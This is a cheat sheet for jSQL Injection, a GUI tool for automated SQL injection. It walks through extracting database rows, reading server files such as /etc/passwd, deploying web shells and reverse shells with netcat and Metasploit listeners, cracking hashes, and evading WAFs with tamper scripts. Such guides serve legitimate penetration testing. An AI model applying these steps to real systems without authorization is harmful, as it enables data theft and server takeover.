# jSQL Injection CHEATSHEET

## Overview
GUI-based automatic SQL injection tool — extracts databases, tables, columns, and rows from vulnerable web applications.

## Quick Start

```bash
# Launch jSQL Injection
java -jar jsql-injection-v0.115.jar

# On Kali Linux
jsql
```

## Basic Workflow

1. Enter vulnerable URL in address bar
2. Click **Inject** (syringe icon)
3. Wait for strategy identification
4. Expand database tree (left panel)
5. Select table → Right-click → **Load** rows
6. Export results (right-click → Export)

## URL Format

```
http://target.example.com/page.php?id=1
```

No injection marker needed — jSQL appends payloads automatically to parameters.

## Supported Databases

| Database | Engine Selector |
|----------|----------------|
| MySQL | MySQL |
| PostgreSQL | PostgreSQL |
| Microsoft SQL Server | MSSQL |
| Oracle | Oracle |
| SQLite | SQLite |
| Microsoft Access | Access |
| DB2 | DB2 |
| H2 | H2 |
| Firebird | Firebird |

## Injection Strategies

| Strategy | When to Use | Speed |
|----------|-------------|-------|
| **UNION** | When columns can be combined | Fast |
| **ERROR** | When SQL errors are returned | Fast |
| **BLIND** | No errors, no UNION possible | Medium |
| **TIME** | Last resort, works everywhere | Slow |

## Manual Strategy Selection

1. Enter URL: `http://target/page.php?id=1'`
2. Click the **SQL Engine** dropdown (below address bar)
3. Select database engine
4. Select strategy from the Strategy dropdown
5. Click **Inject**

## Tab Reference

| Tab | Purpose | How to Access |
|-----|---------|---------------|
| Database | Main injection + data extraction | Default tab |
| Admin Page | Scan for admin login pages | Click "Admin Page" tab |
| Read File | Read files via DB functions | Click "Read File" tab |
| Exploit | Command exec, file upload, shell | Click "Exploit" tab |
| Brute Force | Crack extracted hashes | Click "Brute Force" tab |
| Encoding | Encode/decode text | Click "Encoding" tab |
| Batch Scan | Test multiple URLs | Click "Batch Scan" tab |

## Database Extraction

```bash
# After injection succeeds:
# 1. Expand tree: Database → Tables → Columns
# 2. Right-click table → Load
# 3. Results appear in right panel
# 4. Sort by clicking column headers
# 5. Search with the filter box
# 6. Export: right-click → Export → CSV/XML
```

## File Read Operations

```bash
# 1. Switch to Read File tab
# 2. Ensure target is already injected
# 3. Enter file path:
#    Linux:   /etc/passwd
#    Windows: C:\Windows\System32\drivers\etc\hosts
#    Config:  /etc/mysql/my.cnf
# 4. Click Read
# 5. Content appears in right panel
```

### Supported File Paths by DB

| Database | Example Read Paths |
|----------|-------------------|
| MySQL | `/etc/passwd`, web config files |
| MSSQL | `C:\Windows\win.ini`, web config |
| PostgreSQL | `/etc/passwd` (if superuser) |
| Oracle | Config files via UTL_FILE |

## Exploit Tab

```bash
# Available exploit types:
# 1. Write File — write arbitrary files to disk
# 2. Web Shell — deploy a PHP/JSP/ASP shell
# 3. Reverse Shell — connect back to attacker

# Workflow:
# 1. Select exploit type on left
# 2. Configure parameters (IP, port, path)
# 3. Click Create
# 4. Start listener on attacker machine
```

## Reverse Shell Setup

```bash
# Attacker listener options:
nc -lvnp 4444                              # Netcat
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x86/shell_reverse_tcp; set LPORT 4444; run"  # Metasploit
python3 -m pwncat 4444                      # pwncat
```

## Brute Force / Hash Cracking

```bash
# 1. Switch to Brute Force tab
# 2. Paste hash from database extraction
# 3. Select hash type: MD5, SHA1, SHA256, bcrypt, etc.
# 4. Configure charset and length
# 5. Click Start
# 6. Original text displays when found
```

## Encoding Tools

```bash
# Access: Encoding tab
# Supports:
#   - Base64 (encode/decode)
#   - URL encode/decode
#   - Hex encode/decode
#   - HTML entities
#   - Unicode

# Use case: decode WAF evasion payloads
```

## Batch Scan

```bash
# 1. Switch to Batch Scan tab
# 2. Add URLs to left panel (one per line)
# 3. Click Start
# 4. Each URL tagged: VULNERABLE / NOT VULNERABLE
# 5. Double-click vulnerable URL to load in Database tab
```

## Tamper Scripts (WAF Bypass)

| Tamper | Effect |
|--------|--------|
| `space2comment` | Spaces → `/**/` |
| `randomcase` | Random character casing |
| `encodeurl` | URL-encode payload chars |
| `charencode` | Char-based encoding |
| `between` | `>` → `NOT BETWEEN 0 AND` |

## Preferences Configuration

```
Connection:
  Timeout: 10000 ms (increase for slow targets)
  Threads: 4 (reduce for stealth)

Tamper:
  Enable/disable tamper scripts

Proxy:
  Host: 127.0.0.1
  Port: 8080
```

## Useful Shortcuts

| Action | Method |
|--------|--------|
| Start injection | Click syringe icon |
| Stop injection | Click stop icon |
| Copy row | Right-click → Copy |
| Export data | Right-click → Export → CSV/XML |
| Clear results | File → New Session |
| Switch theme | Preferences → Theme |

## Common Injection Point Patterns

```
# GET parameter
http://target/page.php?id=1

# Multiple parameters
http://target/page.php?id=1&name=test

# Cookie injection
Inject in Cookie header: session=VALUE

# POST body
page.php with POST: id=1&name=test
```

## Installation

```bash
# Kali Linux
sudo apt update && sudo apt install jsql

# Manual install
wget https://github.com/ron190/jsql-injection/releases/download/v0.115/jsql-injection-v0.115.jar
java -jar jsql-injection-v0.115.jar

# Requirements: Java 21-25
java -version
```

## Quick Reference

| Task | Tab | Steps |
|------|-----|-------|
| Find injection | Database | Enter URL → Inject |
| Extract table data | Database | Expand tree → Load |
| Read server files | Read File | Enter path → Read |
| Deploy web shell | Exploit | Select type → Create |
| Crack passwords | Brute Force | Paste hash → Start |
| Encode/decode | Encoding | Enter text → Select method |
| Test many URLs | Batch Scan | Add URLs → Start |

## Troubleshooting

```bash
# GUI won't start
java -version  # Verify Java 21+
export DISPLAY=:0  # Fix display

# Injection not found
# 1. Verify URL works in browser
# 2. Try manual engine/strategy selection
# 3. Check if WAF is blocking (use tamper scripts)

# Slow extraction
# 1. Reduce threads in Preferences
# 2. Use TIME strategy only when necessary
# 3. Extract specific tables, not entire DB

# File read fails
# 1. Check DB user privileges
# 2. Verify file path is correct
# 3. Check secure_file_priv (MySQL)
```
